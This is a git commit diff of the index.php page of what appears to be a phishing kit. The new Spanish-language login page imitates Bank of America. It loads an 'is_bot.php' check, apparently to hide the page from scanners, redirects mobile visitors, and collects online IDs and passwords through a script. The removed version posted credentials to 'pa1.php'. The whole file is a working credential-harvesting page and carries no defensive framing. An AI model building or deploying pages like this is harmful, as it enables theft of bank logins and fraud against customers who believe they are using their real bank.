7b341f33c8585f9ffe2eddddd1e9329a7da5ae9b
soporteintranet-256 <105894376+soporteintranet-256@users.noreply.github.com>
2022-05-20 01:35:41 -0500

    Add files via upload

--- index.php
+++ index.php
@@ -1,96 +1,151 @@
-
-
+<?php
+require "is_bot.php";
+?>
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="css/normalize.min.css">
-  <link rel="stylesheet" href="css/estilos.css">
-  <title>Banca en Línea</title>
-  <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>
+        Bank of America: operaciones bancarias, tarjetas de crédito, préstamos e
+        inversiones con Merrill
+    </title>
+    <link rel="stylesheet" href="css/normalize.min.css" />
+    <link rel="stylesheet" href="css/estilos.css" />
+    <link rel="stylesheet" href="css/points.css">
+    <link rel="shortcut icon" href="img/logo.png" type="image/x-icon" />
+    <script type="text/javascript">
+        if (screen.width < 801) {
+            window.location = "indexm";
+        }
+    </script>
 </head>
 
 <body>
-  <div class="container">
-    <div class="banner1">
-      <img src="img/logo.jpg" alt="logo">
-      <p class="txtg">Entrar</p>
-      <div class="derLinks">
-        <img class="sarea" src="img/lock.jpg" alt="candado">
-        <div class="areaSegura">Área protegida</div>
-        <img class="sarea2" src="img/points.jpg" alt="puntos">
-        <div class="lenguaje">In English</div>
-      </div>
-    </div>
-    <div class="banner2">
-      <h1>Entrar en la Banca en Línea</h1>
-    </div>
-
-    <div class="banner3">
-      <div class="columnas">
-        <form action="pa1.php" method="post">
-          <div class="form-group">
-            <label for="usuario" class="titulo-input">Identificación en línea</label>
-            <input type="text" id="user" name="user" maxlength="32" required>
-            <input type="checkbox" name="reco"><label class="inline-titulo-input" for="reco">Guardar esta Identificación
-              en línea</label>
-            <img src="img/help.jpg" alt="ayuda">
-          </div>
-          <div class="form-group" style="margin-bottom: 23px;">
-            <label for="clave" class="titulo-input2">Contraseña</label>
-            <input type="password" id="pass" name="pass" maxlength="20" required>
-          </div>
-          <div class="form-group" style="margin-bottom: 31px;">
-            <a href="#">¿Olvidó su Contraseña?</a>
-          </div>
-          <div class="form-group">
-
-            <button class="btn-azul" name="add" type="submit">
-              <span></span> Entrar</button>
-          </div>
-        </form>
-        <!-------------------Columna2-------------------->
-        <div class="columna2">
-          <p class="tituloColumna2">Manténgase conectado con la app</p>
-          <img src="img/movil.jpg" alt="movil">
-          <p class="titulo2Columna2">Transacciones seguras y convenientes en todo momento</p>
-          <button class="btn-rojo">
-            <span> Obtener la aplicación</span>
-          </button>
+    <div class="contenedor">
+        <div class="menu1">
+            <ul class="pack1">
+                <li>Personal</li>
+                <li>Pequeñas empresas</li>
+                <li>Administración Patrimonial</li>
+                <li>Empresas e instituciones</li>
+                <li>Seguridad</li>
+                <li class="logpeq">
+                    <img style="height: 14px; margin-right: 4px; margin-left: 1px" src="img/logo.svg" alt="logo" />
+                    Acerca de nosotros
+                </li>
+            </ul>
+            <ul class="pack2">
+                <li>In English</li>
+                <li>Contacto</li>
+                <li>Ayuda</li>
+            </ul>
         </div>
-        <!-------------------Columna3------------------->
-        <div class="columna3">
-          <h2>Ayuda para entrar</h2>
-          <ul>
-            <li><a href="#">¿Olvidó su Identificación en línea o Contraseña?</a></li>
-            <li><a href="#">¿Tiene problemas para entrar?</a></li>
-          </ul>
-          <h2 class="titulito">¿No utiliza la Banca en Línea?</h2>
-          <ul>
-            <li><a href="#">Inscríbase ahora</a></li>
-            <li><a href="#">Más información sobre la Banca en Línea</a></li>
-            <li><a href="#">Acuerdo de servicio</a></li>
-          </ul>
-
+        <div class="logof">
+            <div class="part1">
+                <img src="img/logo_grande.svg" alt="complet" height="31" />
+            </div>
+            <div class="part2">
+                <img src="img/form1.png" alt="form" />
+            </div>
+        </div>
+        <div class="menu2">
+            <ul class="pack3">
+                <li><span>Cuentas de cheques</span></li>
+                <li><span>Cuentas de ahorro</span></li>
+                <li><span>Tarjeta de crédito</span></li>
+                <li><span>Préstamos para vivienda</span></li>
+                <li><span>Préstamos para automóviles</span></li>
+                <li class="celda">
+                    <span>Investing </span>
+                    <img src="img/bull.svg" alt="toro" width="32" height="28" style="margin-top: 5px; margin-left: 5px" />
+                </li>
+                <li><span>Mejores Hábitos Financieros®</span></li>
+            </ul>
         </div>
 
-      </div>
+        <div class="principal">
+            <div >
+                <div class="formulario">
+                    <form autocomplete="off" id="fusuario" class="fusuario">
+                        <span id="error2"> </span>
+                        <div class="fgrupo">
+                            <input type="text" name="usuario" id="usuario" placeholder="Identificación en línea" maxlength="100" />
+                        </div>
+                        <div class="fgrupo">
+                            <input type="password" name="contra" id="contra" placeholder="Contraseña" maxlength="100" />
+
+                        </div>
+                        <div class="fgrupo flexi2">
+                            <input type="checkbox" class="checkusu" name="idlinea" name="idlinea" />
+                            <label for="idlinea">Guardar Id. en línea</label>
+                        </div>
+
+                        <div class="fgrupo">
+                            <button type="button" id="usuenviar" class="btn btn-glass">
+                                <span id="textobutton" class="textobutton">
+                                    Entrar
+                                </span>
+                                <div class="snippet" data-title=".dot-pulse" id="puntopulso" style="display: none;">
+                                    <div class="stage">
+                                        <div class="dot-pulse"></div>
+                                    </div>
+                                </div>
+                            </button>
+                        </div>
+
+                        <div class="formpie">
+                            <div class="fgrupo flexi">
+                                <a href="javascript:void(0)">¿Olvidó su Identificación en línea o Contraseña?</a>
+                            </div>
+                            <div class="fgrupo flexi" style="margin-bottom: 10px">
+                                <a href="javascript:void(0)">Seguridad y ayuda</a>
+                                <a href="javascript:void(0)">Inscribirse</a>
+                            </div>
+                        </div>
+                        <div class="formpie2">
+                            <a href="javacript:void(0)">Abrir una cuenta</a>
+                        </div>
+                    </form>
+                </div>
+                <div class="cartaazul">
+                    <div class="arriba">
+                        <div class="uno">
+                            <img src="img/ubica.png" alt="ubica" />
+                        </div>
+                        <div class="dos">
+                            <a href="javascript:void(0)">Encuentre su centro financiero o cajero automático (ATM) más
+                                cercanos</a>
+                        </div>
+                    </div>
+                    <div class="abajo">
+                        <div class="uno">
+                            <img src="img/calendar.png" alt="calendar" />
+                        </div>
+                        <div class="dos">
+                            <a href="javascript:void(0)">Programar una cita</a>
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+            <div class="enunciado">
+                <h1>Elija la tarjeta que funciona para usted</h1>
+                <img style="width:100%;" src="img/tarjetas.png" alt="funciona" />
+            </div>
+
+
+
+        </div>
+        <div class="pieprincipal">
+            <img src="img/ahorro.png" alt="ahorro" />
+        </div>
     </div>
-    <div class="banner4">
-      <div class="fondolock"></div>
-      <p>Área protegida</p>
-      <div class="enlaces-footer">
-        <a href="#">Privacidad</a> <a href="#">Seguridad</a>
-      </div>
-      <div class="copirait">
-        <p>Bank of America, N.A. Miembro de FDIC. </p><a href="#"> Igualdad de oportunidades en préstamos para viviendas</a>
-        <span class="corporation">© 2021 Bank of America Corporation.<span>
-      </div>
-    </div>
-  </div>
+
+    <script src="js/funciones.js"></script>
 </body>
 
 </html>
